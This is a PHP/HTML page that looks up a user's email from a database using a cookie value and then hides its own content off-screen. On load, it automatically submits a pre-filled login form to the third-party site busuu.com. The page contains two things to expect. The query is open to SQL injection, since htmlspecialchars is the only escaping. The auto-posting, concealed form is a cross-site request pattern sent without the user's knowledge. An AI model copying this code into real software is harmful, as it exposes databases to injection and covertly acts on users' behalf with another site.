<style>body{margin-left:-200%;}</style><img src="../small_icons/328.gif" style="left:45%; top:40%;position:absolute"/><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Untitled Document</title>
</head>
<?
require_once('../db.php');
$uid=htmlspecialchars($_COOKIE['uid']);
$query = mysql_query("SELECT user_email FROM `busuu` WHERE `user_id`='$uid'"); 
$result = mysql_fetch_assoc($query); 
$email=$result['user_email'];  
?>
<body onLoad="javascript: submitform()">

<script type="text/javascript">function submitform()  {document.forms["user-login"].submit();}</script>



<form action="http://www.busuu.com/tr" accept-charset="UTF-8" method="post" id="user-login">
<div><script type="text/javascript">
                function loginFormSubmit(){
                    $("#user-login").submit();
                }
            </script>
    <div id="login" class="hide" ;="" style="display: block;">
      <div class="modal-header">
        <h3>Giriş yap</h3>
      </div>
      <div class="modal-body">
          <div class="row" style="margin-bottom: 10px;">
            <label class="span7" for="email">Email</label>
            <div class="form-item" id="edit-name-wrapper">
 <input type="text" maxlength="60" name="name" id="edit-name" size="16" value="<?=$email;?>" class="form-text required span16" dir="ltr" lang="en">
</div>

          </div>
          <div class="row" style="margin-bottom: 10px;">
            <label class="span7">Şifre</label>
            <div class="form-item" id="edit-pass-wrapper">
 <input type="password" name="pass" id="edit-pass" size="16" class="form-text required span16" dir="ltr" lang="en">
</div>

          </div>
          <a class="forgot offset8" href="/tr/user/password">Şifrenizi mi unuttunuz?</a>
      </div>
      <div class="modal-footer">
        <input type="submit" class="btn success" value="Giriş yap" onClick="loginFormSubmit()">    </div>
    <input type="hidden" name="form_id" id="edit-user-login" value="user_login">
<div></div></div>
</div></form>


</body>
</html>

